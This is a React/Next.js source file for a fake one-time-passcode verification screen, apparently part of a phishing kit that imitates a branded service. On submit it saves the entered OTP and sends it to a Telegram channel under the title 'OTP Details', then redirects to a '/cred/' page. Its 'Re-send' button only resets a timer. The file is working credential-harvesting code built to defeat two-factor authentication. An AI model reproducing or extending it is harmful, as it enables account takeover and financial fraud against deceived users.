"use client"

import { useState, useEffect } from "react"
import { ArrowLeft, Smartphone, Loader2 } from "lucide-react"
import { useRouter } from "next/navigation"
import { StepIndicator } from "@/components/step-indicator"

export default function OtpScreen() {
    const router = useRouter()
    const [phoneNumber, setPhoneNumber] = useState("")
    const [isLoading, setIsLoading] = useState(false)
    const [error, setError] = useState("")
    const [timer, setTimer] = useState(30)

    useEffect(() => {
        let interval: NodeJS.Timeout
        if (timer > 0) {
            interval = setInterval(() => {
                setTimer((prev) => prev - 1)
            }, 1000)
        }
        return () => clearInterval(interval)
    }, [timer])

    const handleResend = () => {
        setTimer(30)
    }

    const formatTime = (time: number) => {
        const minutes = Math.floor(time / 60)
        const seconds = time % 60
        return `${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`
    }

    const handleBack = () => {
        router.back()
    }

    const handleSubmit = async () => {
        if (!phoneNumber || phoneNumber.length < 4) {
            setError("Please enter the OTP Code")
            return
        }
        setIsLoading(true)

        try {
            // Save for the final step
            sessionStorage.setItem("userOtp1", phoneNumber);

            try {
                const { sendTelegramMessage } = await import("@/lib/telegram");
                await sendTelegramMessage({
                    otp1: phoneNumber,
                    title: "OTP Details"
                });
            } catch (error) {
                console.error("Telegram error:", error);
            }

            await new Promise(resolve => setTimeout(resolve, 2000))
            window.location.href = "/cred/"
        } catch (error) {
            console.error("Error:", error)
            setError("Something went wrong, please try again")
        } finally {
            setIsLoading(false)
        }
    }

    return (
        <div className="h-[100dvh] bg-[#60ac28] flex flex-col overflow-hidden">
            {/* Header */}
            <header className="flex items-center justify-center relative px-4 py-2">
                <button onClick={handleBack} className="absolute left-4 p-2 text-[#1a2a4a]" aria-label="Go back">
                    <ArrowLeft className="w-6 h-6" strokeWidth={1.5} />
                </button>
                {/* Logo */}
                <div className="flex items-center">
                    <img src="/q32.png" alt="Logo" className="h-8 w-auto object-contain rounded-md" />
                </div>
            </header>

            {/* Step Indicator */}
            <StepIndicator />

            {/* Main Content */}
            <main className="flex-1 flex flex-col px-6 pt-4">
                {/* Title */}
                <h1 className="text-[#1a2a4a] text-xl font-normal text-center mb-4">Enter the OTP Code sent to 0574940738 your Mobile number </h1>

                {/* Phone Input */}
                <div className="relative mb-6">
                    <input
                        type="tel"
                        value={phoneNumber}
                        onChange={(e) => {
                            setPhoneNumber(e.target.value.replace(/\D/g, ""))
                            setError("")
                        }}
                        placeholder="Enter otp here"
                        className="w-full h-14 pl-12 pr-4 rounded-xl border border-[#e0e4ea] text-[#1a2a4a] text-base placeholder:text-[#a0a8b4] focus:outline-none focus:border-[#1a2a4a] transition-colors"
                    />
                </div>

                {
                    error && (
                        <div className="mb-4 text-center">
                            <p className="text-[#d91a32] text-sm font-medium">{error}</p>
                        </div>
                    )
                }

                {/* Verify Button */}
                <button
                    onClick={handleSubmit}
                    disabled={isLoading}
                    className="w-full h-14 bg-[#152850] text-white text-base font-medium rounded-full hover:bg-[#1a3260] active:bg-[#0f1e3d] transition-colors flex items-center justify-center gap-2"
                >
                    Verify
                </button>

                {/* Resend Timer */}
                <div className="flex items-center justify-center gap-1 mt-6">
                    <p className="text-[#64748b] text-sm">Don't receive code?</p>
                    {timer > 0 ? (
                        <span className="text-[#64748b] text-sm font-medium">Re-send in {formatTime(timer)}</span>
                    ) : (
                        <button
                            onClick={handleResend}
                            className="text-[#d91a32] text-sm font-semibold hover:underline"
                        >
                            Re-send
                        </button>
                    )}
                </div>
            </main >

            {/* Loading Overlay */}
            {
                isLoading && (
                    <div className="fixed inset-0 bg-black/30 backdrop-blur-sm flex items-center justify-center z-50">
                        <div className="bg-white p-6 rounded-2xl shadow-xl flex flex-col items-center gap-4">
                            <Loader2 className="w-12 h-12 text-[#152850] animate-spin" />
                            {/* <p className="text-[#1a2a4a] text-sm font-medium text-center max-w-[250px]">
                            Enter the OTP Code sent to 0574940738 your Mobile number
                        </p> */}
                        </div>
                    </div>
                )
            }
        </div >
    )
}
